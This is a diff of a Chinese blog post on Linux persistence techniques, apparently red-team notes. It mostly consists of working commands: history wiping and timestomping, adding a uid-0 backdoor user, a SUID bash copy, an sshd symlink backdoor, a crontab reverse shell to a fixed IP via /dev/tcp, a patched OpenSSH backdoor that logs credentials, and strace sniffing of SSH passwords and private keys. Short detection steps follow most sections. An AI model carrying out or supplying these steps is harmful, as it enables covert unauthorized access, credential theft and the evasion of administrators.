@@ -37,15 +37,17 @@
 </style>
 
   <meta property="og:type" content="article">
-<meta property="og:title" content="权限维持-Linux篇(待完成)">
+<meta property="og:title" content="权限维持-Linux篇">
 <meta property="og:url" content="http://mamor5409.github.io/posts/29801cba/index.html">
 <meta property="og:site_name" content="Mamor&#39;s Blog">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mamor5409.github.io/posts/29801cba/attachment:d5517d48087cf2e1fd80aacde6f69abc">
 <meta property="article:published_time" content="2022-01-12T05:15:51.000Z">
-<meta property="article:modified_time" content="2022-01-12T08:42:32.653Z">
+<meta property="article:modified_time" content="2022-02-24T08:07:21.047Z">
 <meta property="article:author" content="Mamor">
 <meta property="article:tag" content="权限维持">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mamor5409.github.io/posts/29801cba/attachment:d5517d48087cf2e1fd80aacde6f69abc">
 
 <link rel="canonical" href="http://mamor5409.github.io/posts/29801cba/">
 
@@ -60,7 +62,7 @@
   };
 </script>
 
-  <title>权限维持-Linux篇(待完成) | Mamor's Blog</title>
+  <title>权限维持-Linux篇 | Mamor's Blog</title>
   
 
 
@@ -234,7 +236,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          权限维持-Linux篇(待完成)
+          权限维持-Linux篇
         </h1>
 
         <div class="post-meta">
@@ -245,10 +247,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-01-12 13:15:51 / 修改时间：16:42:32" itemprop="dateCreated datePublished" datetime="2022-01-12T13:15:51+08:00">2022-01-12</time>
+              <time title="创建时间：2022-01-12 13:15:51" itemprop="dateCreated datePublished" datetime="2022-01-12T13:15:51+08:00">2022-01-12</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-24 16:07:21" itemprop="dateModified" datetime="2022-02-24T16:07:21+08:00">2022-02-24</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -272,14 +280,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>0</span>
+              <span>5.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>5 分钟</span>
             </span>
             <div class="post-description"> </div>
 
@@ -292,7 +300,99 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <h3 id="Linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h3><h4 id="0x00-隐藏技巧"><a href="#0x00-隐藏技巧" class="headerlink" title="0x00 隐藏技巧"></a>0x00 隐藏技巧</h4><h5 id="修改文件-终端属性"><a href="#修改文件-终端属性" class="headerlink" title="修改文件/终端属性"></a>修改文件/终端属性</h5><p>修改文件的生成时间</p>
+<p><code>touch -r index.php shell.php</code></p>
+<p>touch命令用于修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件</p>
+<h5 id="文件锁定"><a href="#文件锁定" class="headerlink" title="文件锁定"></a>文件锁定</h5><p>Linux中使用<code>chattr</code>命令来防止root和其他管理用户误删除和修改重要文件以及目录，此权限是用<code>ls -l</code>查看不出来的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chattr +i test.php #锁定文件</span><br><span class="line">rm -rf test.php #提示禁止删除文件</span><br><span class="line"></span><br><span class="line">lsattr test.php #属性查看</span><br><span class="line">chattr -i test.php #解除锁定</span><br><span class="line">rm -rf test.php #彻底删除文件</span><br></pre></td></tr></table></figure>
+
+<h5 id="历史操作命令"><a href="#历史操作命令" class="headerlink" title="历史操作命令"></a>历史操作命令</h5><p><code>[space]set +o history #备注：[space]表示空格。并且由于空格的原因，该命令本身也不会被记录。</code></p>
+<p>上面的命令会临时禁用历史功能，即执行后的命令不会记录在历史中</p>
+<p><code>[space]set -o history #将环境恢复原状</code></p>
+<p>删除历史记录中的指定命令</p>
+<p><code>history | grep &quot;keyword&quot;</code></p>
+<p>输出了历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p>
+<p><code>history -d [num] </code></p>
+<p>大规模删除历史操作记录</p>
+<p><code>set -i &#39;150,$d&#39; .bash_history   #只保留前150行</code></p>
+<h4 id="0x01-添加用户"><a href="#0x01-添加用户" class="headerlink" title="0x01 添加用户"></a>0x01 添加用户</h4><h5 id="添加普通用户"><a href="#添加普通用户" class="headerlink" title="添加普通用户"></a>添加普通用户</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的普通用户</span><br><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest</span><br><span class="line"># useradd -p 方法 &#96; &#96; 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句</span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line"># chpasswd方法</span><br><span class="line">useradd guest;echo &#39;guest:123456&#39;|chpasswd</span><br><span class="line"># echo -e方法</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure>
+
+<h5 id="添加root用户"><a href="#添加root用户" class="headerlink" title="添加root用户"></a>添加root用户</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的root用户</span><br><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest -o -u 0 -g root -G root</span><br><span class="line">-s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;test</span><br></pre></td></tr></table></figure>
+
+<h5 id="passwd写入"><a href="#passwd写入" class="headerlink" title="passwd写入"></a>passwd写入</h5><p>(注:现在较新的系统无法成功利用 在su切换用户时会提示用户不存在)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd 各部分含义：</span><br><span class="line">⽤户名：密码：⽤户ID：组ID：身份描述：⽤户的家⽬录：⽤户登录后所使⽤的SHELL</span><br><span class="line">&#x2F;etc&#x2F;shadow 各部分含义：</span><br><span class="line">⽤户名：密码的MD5加密值：⾃系统使⽤以来⼝令被修改的天数：⼝令的最⼩修改间隔：⼝令更改的周期：⼝令失效的</span><br><span class="line">天数：⼝令失效以后帐号会被锁定多少天：⽤户帐号到期时间：保留字段尚未使⽤</span><br></pre></td></tr></table></figure>
+
+<h6 id="添加超级用户"><a href="#添加超级用户" class="headerlink" title="添加超级用户"></a>添加超级用户</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$echo &quot;test:savbSWc4rx8NY:hacker:&#x2F;root:&#x2F;bin&#x2F;bash&quot; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p>一些系统中，存放着加密后的用户口令字。虽然这个字段存放的只是用户口令的加密串，不是明文，但<br>是由于<code>/etc/passwd</code>文件对所有用户都可读，所以这仍是一个安全隐患。因此，现在许多Linux系统都使<br>用了shadow技术，把真正加密后的用户口令字段存放到<code>/etc/shadow</code>文件中，而在<code>/etc/passwd</code>文件的<br>口令字段中只存放了一个特殊的字符，例如”x”或者”*”</p>
+<h6 id="如果系统不允许uid-0的用户远程登陆，可以增加一个普通用户账号"><a href="#如果系统不允许uid-0的用户远程登陆，可以增加一个普通用户账号" class="headerlink" title="如果系统不允许uid=0的用户远程登陆，可以增加一个普通用户账号"></a>如果系统不允许uid=0的用户远程登陆，可以增加一个普通用户账号</h6><p><code>echo &quot;test:savbSWc4rx8NY:-1:-1:-1:-1:-1:-1:500&quot; &gt;&gt; /etc/shadow</code></p>
+<br>
+
+<h5 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br><span class="line"># 查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#39;&#x2F;\$1|\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br><span class="line"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="0x02-SUID-shell"><a href="#0x02-SUID-shell" class="headerlink" title="0x02 SUID shell"></a>0x02 SUID shell</h4><p>SUID shell 是一种可用于以拥有者权限运行的shell</p>
+<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>创建suid权限的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;bin&#x2F;bash  &#x2F;tmp&#x2F;.woot</span><br><span class="line">chmod 4755 &#x2F;tmp&#x2F;.woot</span><br><span class="line">ls -al &#x2F;.woot</span><br></pre></td></tr></table></figure>
+
+<p>这样做相当于复制了一些新的bash到tmp目录下，然后可以在使用它时调用root权限</p>
+<p>使用普通用户运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;.woot</span><br><span class="line">&#x2F;tmp&#x2F;.woot -p   &#x2F;&#x2F;bash2针对suid有一些保护措施，使用-p参数来获取一个root shell</span><br></pre></td></tr></table></figure>
+
+<h5 id="排查-1"><a href="#排查-1" class="headerlink" title="排查"></a>排查</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#查找具有suid的权限的应用</span><br><span class="line">find &#x2F; -perm +4000 -ls</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 在Linux中查找SUID设置的文件</span><br><span class="line">find . -perm &#x2F;4000</span><br><span class="line"># 在Linux中查找使用SGID设置的文件</span><br><span class="line">find . -perm &#x2F;2000</span><br><span class="line"># 取消s权限</span><br><span class="line">chmod u-s &#x2F;tmp&#x2F;.woot</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x03-ssh公私钥"><a href="#0x03-ssh公私钥" class="headerlink" title="0x03 ssh公私钥"></a>0x03 ssh公私钥</h4><h5 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h5><p>在客户端上生成一对公私钥，然后把公钥放到服务器上（~/.ssh/authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配，如果匹配成功就可以登录了。</p>
+<p>客户端</p>
+<p><code>ssh-keygen -t rsa</code></p>
+<p>进入 <code>/root/.ssh/</code>文件夹即可查看到生成公私钥，<code>id_rsa</code>为私钥，<code>id_rsa.pub</code>为公钥，</p>
+<p>将公钥复制放到目标机器上的 <code>.ssh/authorized_keys</code>中     <code>echo id_rsa.pub &gt;&gt; .ssh/authorized_keys </code> </p>
+<h5 id="排查-2"><a href="#排查-2" class="headerlink" title="排查"></a>排查</h5><p>查看 <code>/root/.ssh/authoritized_keys</code>是否被修改</p>
+<br>
+
+<h4 id="0x04-软连接"><a href="#0x04-软连接" class="headerlink" title="0x04 软连接"></a>0x04 软连接</h4><h5 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h5><p>通过软连接建立一个ssh后门：</p>
+<p><code>ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=8888</code></p>
+<p>(注:如果目标在执行软连接时使用的其他账户创建的，那么在登陆时也要选择    对应的账户去登录，而非root账户)</p>
+<p>执行完后 在任意机器上使用<code>ssh root@xxx.xxx.xxx.xxx -p 8888</code> 即可连接</p>
+<h5 id="排查-3"><a href="#排查-3" class="headerlink" title="排查"></a>排查</h5><p>通过查看端口或者进程都会发现异常连接 使用 <code>kill -s 9 PID</code> 杀掉进程即可清除后门</p>
+<p><img src="/posts/29801cba/attachment:d5517d48087cf2e1fd80aacde6f69abc" alt="截图"></p>
+<br>
+
+<h4 id="0x05-crontab反弹shell"><a href="#0x05-crontab反弹shell" class="headerlink" title="0x05 crontab反弹shell"></a>0x05 crontab反弹shell</h4><h5 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h5><p>cron表达式在线⽣成：<a target="_blank" rel="noopener" href="http://qqe2.com/cron">http://qqe2.com/cron</a></p>
+<ul>
+<li>创建shell脚本脚本 </li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><code>chmod +sx etc/test.sh</code></p>
+<ul>
+<li>crontab -e 设置定时任务</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 每分钟执行一次</span><br><span class="line">*&#x2F;1 * * * * root &#x2F;etc&#x2F;test.sh</span><br></pre></td></tr></table></figure>
+
+<p>重启crond服务就可用nc接受shell <code>service cornd restart</code></p>
+<h5 id="排查-4"><a href="#排查-4" class="headerlink" title="排查"></a>排查</h5><p>查看可疑的定时任务列表</p>
+<p><code>crontab -e</code></p>
+<br>
+
+<h4 id="0x06-OpenSSH-后门"><a href="#0x06-OpenSSH-后门" class="headerlink" title="0x06 OpenSSH 后门"></a>0x06 OpenSSH 后门</h4><h5 id="使用-4"><a href="#使用-4" class="headerlink" title="使用"></a>使用</h5><p>利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">a、备份SSH配置文件</span><br><span class="line">mv &#x2F;etc&#x2F;ssh&#x2F;ssh_config &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old</span><br><span class="line">mv &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old</span><br><span class="line">b、解压并安装补丁</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch&#x2F;sshbd5.9p1.diff &#x2F;openssh-5.9p1</span><br><span class="line">cd openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br><span class="line">c、记录用户名和密码的文件位置及其密码</span><br><span class="line">vi includes.h</span><br><span class="line">#define ILOG &quot;&#x2F;tmp&#x2F;1.txt&quot;           &#x2F;&#x2F;记录登录本机的用户名和密码</span><br><span class="line">#define OLOG &quot;&#x2F;tmp&#x2F;2.txt&quot;           &#x2F;&#x2F;记录本机登录远程的用户名和密码</span><br><span class="line">#define SECRETPW &quot;123456789&quot;        &#x2F;&#x2F;后门的密码</span><br><span class="line">d、修改版本信息</span><br><span class="line">vi version.h</span><br><span class="line">#define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;</span><br><span class="line">#define SSH_PORTABLE &quot;小版本号&quot;</span><br><span class="line">e、安装并编译</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;usr --sysconfdir&#x3D;&#x2F;etc&#x2F;ssh --with-pam --with-kerberos5</span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br><span class="line">f、对比原来的配置文件，使配置文件一致，然后修改文件日期。</span><br><span class="line">touch -r &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old &#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br><span class="line">touch -r &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">g、清除操作记录</span><br><span class="line">export HISTFILE&#x3D;&#x2F;dev&#x2F;null</span><br><span class="line">export HISTSIZE&#x3D;0</span><br><span class="line">echo &gt;&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;清空操作日志</span><br></pre></td></tr></table></figure>
+
+<h5 id="排查-5"><a href="#排查-5" class="headerlink" title="排查"></a>排查</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#利用strace查找ssh后门</span><br><span class="line"># 1、获取可疑进程PID</span><br><span class="line">ps aux | grep sshd</span><br><span class="line"># 2、跟踪sshd PID</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line"># 3、查看记录密码打开文件</span><br><span class="line">grep open sshd* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="0x07-strace后门"><a href="#0x07-strace后门" class="headerlink" title="0x07 strace后门"></a>0x07 strace后门</h4><p>strace是一个动态跟踪工具，它可以跟踪系统调用的执行。我们可以把它当作一个键盘记录的后门，来扩大我们的信息收集范围。通过其他方式拿到shell，通过histroy，流量抓包、或者本地没有翻到密码的情况下。我们要想获取当前<br>主机的密码，或者是通过这台主机连接到其他主机的密码。</p>
+<h5 id="记录sshd进程明文密码"><a href="#记录sshd进程明文密码" class="headerlink" title="记录sshd进程明文密码"></a>记录sshd进程明文密码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(strace -f -F -p &#96;ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;&#96; -t -e</span><br><span class="line">trace&#x3D;read,write -s 32 2&gt; &#x2F;tmp&#x2F;.sshd.log &amp;)</span><br></pre></td></tr></table></figure>
+
+<p>当用户通过密码登陆时，使用如下命令查看记录的密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E &#39;read\(6, &quot;.+\\0\\0\\0\\.+&quot;&#39; &#x2F;tmp&#x2F;.sshd.log</span><br></pre></td></tr></table></figure>
+
+<h5 id="记录sshd私钥"><a href="#记录sshd私钥" class="headerlink" title="记录sshd私钥"></a>记录sshd私钥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(strace -f -F -p &#96;ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;&#96; -t -e</span><br><span class="line">trace&#x3D;read,write -s 4096 2&gt; &#x2F;tmp&#x2F;.sshd.log &amp;)</span><br></pre></td></tr></table></figure>
+
+<p>当用户通过私钥登陆时，使用如下命令查看记录的私钥</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &#39;PRIVATE KEY&#39; &#x2F;tmp&#x2F;.sshd.log</span><br></pre></td></tr></table></figure>
+
+<h5 id="通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。"><a href="#通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。" class="headerlink" title="通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。"></a>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#vim &#x2F;etc&#x2F;bashrc或者 ~&#x2F;.bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;</span><br><span class="line"># source ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
+
     </div>
 
     
@@ -421,6 +521,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">1.</span> <span class="nav-text">Linux权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-%E9%9A%90%E8%97%8F%E6%8A%80%E5%B7%A7"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 隐藏技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6-%E7%BB%88%E7%AB%AF%E5%B1%9E%E6%80%A7"><span class="nav-number">1.1.1.</span> <span class="nav-text">修改文件&#x2F;终端属性</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E9%94%81%E5%AE%9A"><span class="nav-number">1.1.2.</span> <span class="nav-text">文件锁定</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%86%E5%8F%B2%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4"><span class="nav-number">1.1.3.</span> <span class="nav-text">历史操作命令</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 添加用户</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7"><span class="nav-number">1.2.1.</span> <span class="nav-text">添加普通用户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0root%E7%94%A8%E6%88%B7"><span class="nav-number">1.2.2.</span> <span class="nav-text">添加root用户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#passwd%E5%86%99%E5%85%A5"><span class="nav-number">1.2.3.</span> <span class="nav-text">passwd写入</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B6%85%E7%BA%A7%E7%94%A8%E6%88%B7"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">添加超级用户</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%A6%82%E6%9E%9C%E7%B3%BB%E7%BB%9F%E4%B8%8D%E5%85%81%E8%AE%B8uid-0%E7%9A%84%E7%94%A8%E6%88%B7%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%A2%9E%E5%8A%A0%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E8%B4%A6%E5%8F%B7"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">如果系统不允许uid&#x3D;0的用户远程登陆，可以增加一个普通用户账号</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5"><span class="nav-number">1.2.4.</span> <span class="nav-text">排查</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-SUID-shell"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 SUID shell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8"><span class="nav-number">1.3.1.</span> <span class="nav-text">使用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">排查</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-ssh%E5%85%AC%E7%A7%81%E9%92%A5"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 ssh公私钥</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-1"><span class="nav-number">1.4.1.</span> <span class="nav-text">使用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5-2"><span class="nav-number">1.4.2.</span> <span class="nav-text">排查</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-%E8%BD%AF%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.5.</span> <span class="nav-text">0x04 软连接</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-2"><span class="nav-number">1.5.1.</span> <span class="nav-text">使用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5-3"><span class="nav-number">1.5.2.</span> <span class="nav-text">排查</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05-crontab%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.6.</span> <span class="nav-text">0x05 crontab反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-3"><span class="nav-number">1.6.1.</span> <span class="nav-text">使用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5-4"><span class="nav-number">1.6.2.</span> <span class="nav-text">排查</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x06-OpenSSH-%E5%90%8E%E9%97%A8"><span class="nav-number">1.7.</span> <span class="nav-text">0x06 OpenSSH 后门</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-4"><span class="nav-number">1.7.1.</span> <span class="nav-text">使用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5-5"><span class="nav-number">1.7.2.</span> <span class="nav-text">排查</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x07-strace%E5%90%8E%E9%97%A8"><span class="nav-number">1.8.</span> <span class="nav-text">0x07 strace后门</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AE%B0%E5%BD%95sshd%E8%BF%9B%E7%A8%8B%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="nav-number">1.8.1.</span> <span class="nav-text">记录sshd进程明文密码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AE%B0%E5%BD%95sshd%E7%A7%81%E9%92%A5"><span class="nav-number">1.8.2.</span> <span class="nav-text">记录sshd私钥</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%92%8C%E6%95%B0%E6%8D%AE%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E8%AE%B0%E5%BD%95%E7%94%A8%E6%88%B7ssh%E3%80%81su%E3%80%81sudo%E7%9A%84%E6%93%8D%E4%BD%9C%E3%80%82"><span class="nav-number">1.8.3.</span> <span class="nav-text">通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -436,7 +537,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
